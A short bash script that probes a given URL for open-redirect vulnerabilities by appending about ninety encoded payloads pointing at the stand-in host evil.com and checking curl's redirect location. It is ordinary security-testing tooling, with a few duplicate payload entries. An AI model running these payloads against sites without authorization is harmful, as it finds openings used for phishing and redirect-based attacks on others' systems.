#!/bin/bash

# Check if a URL argument is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

# The URL to test for open redirects
url=$1

# List of common open redirect payloads
payloads=(
    "//evil.com"
    "http://evil.com"
    "https://evil.com"
    "/%5cevil.com"
    "/%09evil.com"
    "/%0aevil.com"
    "/%23evil.com"
    "/?next=http://evil.com"
    "/?url=http://evil.com"
        "/?next=http://evil.com"
    "/?url=http://evil.com"
    "/?redirect=http://evil.com"
    "/?redirect_url=http://evil.com"
    "/?redir=http://evil.com"
    "/?goto=http://evil.com"
    "/?dest=http://evil.com"
    "/?destination=http://evil.com"
    "/?continue=http://evil.com"
    "/?to=http://evil.com"
    "/?out=http://evil.com"
    "/?view=http://evil.com"
    "/?path=http://evil.com"
    "/?site=http://evil.com"
    "/?domain=http://evil.com"
    "/?r=http://evil.com"
    "/?u=http://evil.com"
    "/?forward=http://evil.com"
    "/?validate=http://evil.com"
    "/?return=http://evil.com"
    "/?callback=http://evil.com"
    "/?return_to=http://evil.com"
    "/?return_url=http://evil.com"
    "/?nav=http://evil.com"
    "/?data=http://evil.com"
    "/?reference=http://evil.com"
    "/?dir=http://evil.com"
    "/?ref=http://evil.com"
    "/?uri=http://evil.com"
    "/?target=http://evil.com"
    "/?file=http://evil.com"
    "/?document=http://evil.com"
    "/?folder=http://evil.com"
    "/?page=http://evil.com"
    "/?view=http://evil.com"
    "/evil.com"
    "/evil.com/"
    "//evil.com/"
    "//evil.com/%2e%2e"
    "//evil.com/%2e%2e%2f"
    "//evil.com/%2e%2e%5c"
    "/%5cevil.com/"
    "/%5c%5cevil.com/"
    "/%2Fevil.com"
    "/%09%2Fevil.com"
    "/%5c%09evil.com"
    "/%5c%5cevil.com%09"
    "/%09%5cevil.com"
    "/%5c%5c%09evil.com"
    "/%09%5c%5cevil.com"
    "/%5cevil.com%09"
    "/%2fevil.com/"
    "/%2fevil.com/%2f"
    "/%2fevil.com%2f"
    "/%09evil.com%09"
    "/%09%2fevil.com%09"
    "/%09%5cevil.com%09"
    "/%5cevil.com%09%5c"
    "/%09evil.com%5c"
    "/%5c%09%5cevil.com"
    "/%09%5cevil.com%5c"
    "/%5cevil.com%09%2f"
    "/%2fevil.com%09"
    "/%09%2fevil.com%09%2f"
    "/%09%2fevil.com%09%5c"
    "/%09%5cevil.com%09%2f"
    "/%5cevil.com%09%2f"
    "/%5cevil.com%5c"
    "/%2Fevil.com/%2E"
    "/%2Fevil.com/%2E%2E"
    "/%2Fevil.com/%2E%2E/"
    "/%2Fevil.com/%2E%2E%2F"
    "/%2Fevil.com/%2E%2E%5C"
    "/%2Fevil.com/%2E%2E%5C%5C"
    "/%5cevil.com/%2E"
    "/%5cevil.com/%2E%2E"
    "/%5cevil.com/%2E%2E/"
    "/%5cevil.com/%2E%2E%2F"
    "/%5cevil.com/%2E%2E%5C"
    "/%5cevil.com/%2E%2E%5C%5C"
    "/?q=http://evil.com"
    "/?request=http://evil.com"
    "/?navigation=http://evil.com"
    "/?goto=//evil.com"
    "/?continue=//evil.com"
)

# Function to test for open redirect
check_open_redirect() {
    local full_url="$1$2"
    echo "Checking: $1$2"  # Show both the URL and payload
    response=$(curl -s -o /dev/null -w "%{redirect_url}" "$full_url")

    if [[ "$response" == *"evil.com"* ]]; then
        echo "Success: $full_url"
        return 0
    fi
    return 1
}

# Iterate through each payload and test for open redirect
for payload in "${payloads[@]}"; do
    if check_open_redirect "$url" "$payload"; then
        break
    fi
done
